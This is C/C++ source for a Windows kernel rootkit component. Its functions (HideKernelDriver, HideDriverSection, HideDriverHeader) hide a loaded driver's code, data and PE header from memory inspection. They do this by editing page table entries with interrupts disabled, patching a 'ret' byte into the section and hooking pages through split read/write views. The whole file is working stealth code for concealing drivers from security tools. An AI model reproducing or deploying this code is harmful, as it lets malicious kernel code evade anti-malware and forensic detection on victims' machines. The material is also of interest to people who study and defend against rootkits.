
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//////////////////// HIGH LEVEL INTERFACE FUNCTIONS ////////////////////////
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

extern "C"
{
	#include "ntddk.h"
}

#include "mmHook.h"
#include "module.h"

MODULE g_Mod = {0};
ULONG g_numberOfSections = 0;

struct SECTION
{
	bool Hidden;
	ULONG VirtualAddress;
};

SECTION SectionMask[MAX_NUMBER_OF_PE_SECTIONS] = {false}; //Hidden sections 1...N.PE Header


/*********************************************************************************
* HideKernelDriver - Right now limited in implementatin to hiding the code pages
*					 in a driver specified as residing in the .text section.
*
* Parameters - Name of the driver being hidden.
*
* Return -	1 or an error code.
*
* Error Codes: 	ERROR_RETRIEVING_MODULE_LIST, MODULE_NOT_FOUND, 
				ERROR_DRIVER_SECTIONS_MUST_BE_PAGE_ALIGNED
*				
* NOTE: Driver sections must be page aligned (0x1000 bytes) or the function will
* return an error and fail.
*
**********************************************************************************/
int HideKernelDriver(char* DriverName, int Options)
{
	//Make sure this is not a HT / MP system. We don't support them!
	
	//Get the base address of the driver we want to hide
	int success = GetModuleBase( DriverName, &g_Mod );

	if( success == ERROR_RETRIEVING_MODULE_LIST || success == MODULE_NOT_FOUND )
		return success;  //there was an error

	//Get the number of pages across the driver
	int numDriverPages = GetNumberOfPagesInRange( (PVOID)g_Mod.Base, (PVOID)g_Mod.End );

	//Verify that sections are page aligned (ie. section alignment field in PE header == 0x1000)
	ULONG pModPeHeader = ULONG(*((ULONG*)((ULONG)(g_Mod.Base + 0x3C))) + g_Mod.Base);
	ULONG SectionAlignment = *((ULONG*)((ULONG)(pModPeHeader + 0x38)));
	if( SectionAlignment != PAGE_SIZE )
		return ERROR_DRIVER_SECTIONS_MUST_BE_PAGE_ALIGNED;

	g_numberOfSections = *((USHORT*)((ULONG)(pModPeHeader + 0x06)));
	ULONG pSectionBase = (ULONG)(pModPeHeader + 0xF8);

	ULONG pfnCallIntoHookedPage = 0;

	//hide the specified sections
	success = 0;
	for( int i = 0; i < g_numberOfSections;  i++)
	{
		SectionMask[i].VirtualAddress = g_Mod.Base + *((ULONG*)((ULONG)(pSectionBase + 0x0C))); //va for mapped section

		if( Options & HIDE_ALL )
		{
			success = HideDriverSection( pSectionBase );
			if( success == 1 )
				SectionMask[i].Hidden = true;
		}//end if
		else
		{
			if( (Options & HIDE_CODE) && (strcmp( (char*)pSectionBase, ".text" ) == 0) )
			{
				success = HideDriverSection( pSectionBase );
				if( success == 1 )
					SectionMask[i].Hidden = true;
			}//end if
		
			if( (Options & HIDE_DATA) && (strcmp( (char*)pSectionBase, ".data" ) == 0) )
			{
				success = HideDriverSection( pSectionBase );
				if( success == 1 )
					SectionMask[i].Hidden = true;
			}//end if
		
			pSectionBase = pSectionBase + 0x28; //next section
		}//end else

	}//end for

	if( Options & HIDE_HEADER )
	{
		HideDriverHeader( (ULONG)g_Mod.Base );
		SectionMask[g_numberOfSections].Hidden = true;
	}//end if
	
	return true;
}//end HideKernelDriver




/*********************************************************************************
* UnhideKernelDriver - Unhides a driver hidden by the function HideKernelDriver
*
* Parameters - Name of the driver being unhidden.
*
* Return -	1 or an error code.
*
* Error Codes: 	ERROR_RETRIEVING_MODULE_LIST, MODULE_NOT_FOUND, 
				ERROR_DRIVER_SECTIONS_MUST_BE_PAGE_ALIGNED
*				
* NOTE: Driver sections must be page aligned (0x1000 bytes) or the function will
* return an error and fail.
*
**********************************************************************************/
int UnhideKernelDriver()
{
	//unhide the sections
	for( int i = 0; i < g_numberOfSections; i++)
	{
		if( SectionMask[i].Hidden == true )
		{
			//unhide the page
			UnhookMemoryPage( (PVOID) SectionMask[i].VirtualAddress );

			//free the Read / Write view of the page
			HOOKED_LIST_ENTRY* pListEntry = FindPageInHookedList( SectionMask[i].VirtualAddress );
			DeallocateViewOfPage( pListEntry->pReadWriteView );
		}//end if

	}//end for

	//unhide the header
	if( SectionMask[g_numberOfSections].Hidden == true)
	{
		//unhide the page
		UnhookMemoryPage( (PVOID)g_Mod.Base );

		//free the Read / Write view of the page
		HOOKED_LIST_ENTRY* pListEntry = FindPageInHookedList( g_Mod.Base );
		DeallocateViewOfPage( pListEntry->pReadWriteView );
	}
	return true;
}//end UnhideKernelDriver




/*********************************************************************************
* HideDriverSection - Hides a section in a kernel driver executable
*
* Parameters - PVOID pDriverSectionTableEntry - pointer to the section table entry
*			   for the kernel driver.
*
* Return -	1 or an error code. ERROR_DISCARDABLE_SECTION, ERROR_CANT_INSERT_CALL,
*			ERROR_PTE_NOT_PRESENT, ERROR_PAGE_NOT_PRESENT
*				
**********************************************************************************/
int HideDriverSection( ULONG pDriverSectionHeader )
{
	ULONG pfnCallIntoHookedPage = 0;
	ULONG pSection = 0;

	//get the section 
	ULONG SectionFlags = *((ULONG*)((ULONG)(pDriverSectionHeader + 0x24)));

	pSection = g_Mod.Base + *((ULONG*)((ULONG)(pDriverSectionHeader + 0x0C))); //va for mapped section

	if( (SectionFlags & EXECUTABLE) && !(SectionFlags & DISCARDABLE ) )
	{
		//Look for empty bytes to patch in "ret" so we can call into the hooked page to load up the ITLB
		//Virtual size must be less than page size.
		ULONG SectionSize = *((ULONG*)((ULONG)(pDriverSectionHeader + 0x10)));
		if( SectionSize < PAGE_SIZE )
			pfnCallIntoHookedPage = (pSection + SectionSize + 1);
		else
			return ERROR_CANT_INSERT_CALL;

		//Make sure the section is writable
		if( !(SectionFlags & WRITABLE) )
		{
			__asm cli
			PPTE pPteSection = GetPteAddress( (PVOID)pSection );

			if( ((int)pPteSection == ERROR_PTE_NOT_PRESENT) || ((int)pPteSection == ERROR_PAGE_NOT_PRESENT) ) //this should be non paged memory, but 
				return (int)pPteSection; 																	  //playing it safe
			
			ULONG oldPteSection = (ULONG)*pPteSection;
			MarkPageReadWrite( pPteSection );
			__asm invlpg pSection 
			
			*(ULONG*)pfnCallIntoHookedPage = 0xC3; //patch in the "ret" 	
		
			//restore the old writability of the section
			(ULONG)*pPteSection = oldPteSection;
			__asm invlpg pSection; 
			__asm sti
		}//end if
		else
		{
			*(ULONG*)pfnCallIntoHookedPage = 0xC3; //patch in the "ret" 
		}//end else			
	}//end if

	if( !(SectionFlags & DISCARDABLE) )
	{
		ULONG pAllocatedReadWriteView = 0;
		PVOID pReadWriteView = AllocateViewOfPage( (PVOID)pSection, false, &pAllocatedReadWriteView );
		HookMemoryPage( (PVOID)pSection, pReadWriteView, (PVOID)pfnCallIntoHookedPage, (PVOID)g_Mod.Base, (PVOID)g_Mod.End ); 
		return true;
	}//end if

	return ERROR_DISCARDABLE_SECTION;

}//end HideDriverSection



/*********************************************************************************
* HideDriverHeader - Hides the PE header of a kernel driver
*
* Parameters - PVOID pDriverHeader - pointer to the driver's PE header
*	
* Return - none
*			
**********************************************************************************/
void HideDriverHeader( ULONG pDriverHeader )
{
	ULONG pAllocatedReadWriteView = 0;
	PVOID pReadWriteView = AllocateViewOfPage( (PVOID)pDriverHeader, false, &pAllocatedReadWriteView );
	HookMemoryPage( (PVOID)pDriverHeader, pReadWriteView, NULL, (PVOID)g_Mod.Base, (PVOID)((ULONG)g_Mod.Base + PAGE_SIZE) ); 

}//end HideDriverHeader




/*********************************************************************************
* HideNtoskrnl - NOTE: SOME ISSUES TO RESOLVE HERE!!!
*
* Parameters - 
*
* Return -	
*
* Error Codes: 	 
*
**********************************************************************************/
/*
void HideNtoskrnl( void )
{

}//end HideNtoskrnl
*/